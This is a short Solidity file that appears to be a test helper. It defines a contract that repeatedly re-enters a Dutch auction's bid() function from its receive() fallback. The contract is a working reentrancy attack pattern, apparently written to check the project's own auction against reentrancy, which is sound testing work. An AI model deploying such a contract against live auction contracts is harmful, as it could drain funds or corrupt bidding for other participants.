// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {IDutchAuction} from "src/interfaces/IDutchAuction.sol";
import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";

contract ReentrancyAttackOnBid is Ownable {
    IDutchAuction private dutchAuction;
    uint256 private attackAmount;
    
    constructor(address _dutchAuctionAddress) Ownable(msg.sender) {
        dutchAuction = IDutchAuction(_dutchAuctionAddress);
    }

    function attack() external payable {
        attackAmount = msg.value;
        dutchAuction.bid{value: msg.value}();
    }

    receive() external payable {
        dutchAuction.bid{value: attackAmount}();
    }
}